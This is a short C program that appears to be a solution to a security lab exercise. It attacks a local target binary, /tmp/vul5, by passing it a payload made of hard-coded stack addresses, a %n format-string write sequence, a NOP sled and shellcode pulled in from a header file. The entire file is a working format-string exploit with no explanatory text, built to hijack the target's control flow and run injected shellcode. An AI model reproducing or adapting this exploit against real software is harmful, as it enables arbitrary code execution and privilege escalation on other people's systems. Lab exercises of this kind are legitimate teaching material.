#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul5"

int main(void)
{
char payload[400];
char *format;
memset(payload,0x90,400);
payload[399]='\x00';
format=
	"\xff\xff\xff\xff\x2c\xfb\xff\xbf"
	"\xff\xff\xff\xff\x2d\xfb\xff\xbf"
	"\xff\xff\xff\xff\x2e\xfb\xff\xbf"
	"\xff\xff\xff\xff\x2f\xfb\xff\xbf"
	"%130u%n%92u%n%257u%n%192u%n";
memcpy(payload,format,strlen(format));
memcpy(payload+354,shellcode,45);
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
